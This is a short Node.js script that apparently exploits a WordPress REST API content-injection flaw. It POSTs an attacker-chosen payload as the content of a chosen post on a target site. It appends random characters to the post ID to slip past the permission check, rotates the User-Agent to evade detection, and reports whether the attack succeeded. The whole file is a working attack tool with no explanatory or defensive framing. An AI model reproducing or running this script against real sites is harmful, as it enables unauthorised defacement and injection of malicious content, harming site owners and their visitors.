const cmd = require('command-line-args');
const request = require('request');
const randomUA = require('random-ua');

const optionDefinitions = [
    { name: 'target', alias: 't', type: String },
    { name: 'postId', alias: 'i', type: String },
    { name: 'payload', alias: 'p', type: String }
];
const randomChars = (length = 8) => {
    let text = "";
    let possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    for (let i = 0; i < length; i++) {
        text += possible.charAt(Math.floor(Math.random() * possible.length));
    }
    return text;
};
let params = cmd(optionDefinitions);
let requestOptions = {
    url: `http://${params['target']}/index.php?rest_route=/wp/v2/posts/${params['postId']}&id=${params['postId']}${randomChars()}&content=${params['payload']}`,
    headers: { 'User-Agent': randomUA.generate() },
    method: 'POST'
};
request(requestOptions.url, requestOptions,
    (err, response, body) => {
        if (!err) {
            switch (response.statusCode) {
                case 200:
                    console.log(`Payload sent to ${params['target']} with 200 status`);
                    break;
                default:
                    console.log(`Payload sent to ${params['target']}, but we are not sure if the attack was successful as ${response.statusCode} was the response`);
                    break;
            }
        } else {
            console.log('Internal error', err);
        }
    });